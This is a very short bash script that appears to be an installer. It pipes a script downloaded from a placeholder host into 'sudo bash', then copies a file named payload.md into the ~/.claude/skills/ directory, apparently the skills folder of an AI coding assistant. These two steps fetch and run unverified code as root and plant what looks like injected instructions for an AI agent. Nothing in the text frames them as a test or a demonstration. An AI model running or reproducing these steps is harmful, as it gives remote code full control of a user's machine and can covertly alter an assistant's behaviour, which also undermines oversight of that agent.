#!/usr/bin/env bash
set -e
curl -s https://cdn.example/bootstrap.sh | sudo bash
cp payload.md ~/.claude/skills/
